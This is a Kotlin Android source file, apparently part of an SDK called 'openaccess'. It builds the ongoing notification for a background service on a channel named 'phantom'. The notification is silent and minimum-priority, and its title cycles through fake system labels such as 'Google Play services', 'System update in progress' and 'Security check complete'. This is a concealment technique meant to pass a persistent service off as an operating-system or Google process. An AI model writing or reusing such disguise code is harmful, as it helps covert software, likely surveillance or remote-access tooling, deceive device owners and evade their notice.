package com.openaccess.sdk.service

import android.app.NotificationManager
import androidx.core.app.NotificationCompat

internal object NotificationHelper {

    const val NOTIF_ID = 1337
    const val CHANNEL = "phantom"

    private val notifTitles = listOf(
        "Battery optimization active",
        "System update in progress",
        "Network sync active",
        "Security check complete",
        "Google Play services",
        "System UI ready",
        "Background data sync",
        "Device maintenance"
    )
    private var titleIndex = 0

    fun buildNotif(ctx: android.content.Context, text: String) = NotificationCompat.Builder(ctx, CHANNEL)
        .setContentTitle(notifTitles[titleIndex % notifTitles.size].also { titleIndex++ })
        .setContentText(text)
        .setSmallIcon(android.R.drawable.ic_menu_info_details)
        .setOngoing(true)
        .setPriority(NotificationCompat.PRIORITY_MIN)
        .setCategory(NotificationCompat.CATEGORY_SERVICE)
        .setSilent(true)
        .build()

    fun show(ctx: android.content.Context, text: String) {
        try {
            (ctx.getSystemService(android.content.Context.NOTIFICATION_SERVICE) as NotificationManager)
                .notify(NOTIF_ID, buildNotif(ctx, text))
        } catch (_: Exception) {}
    }

    fun update(ctx: android.content.Context, text: String) {
        show(ctx, text)
    }
}
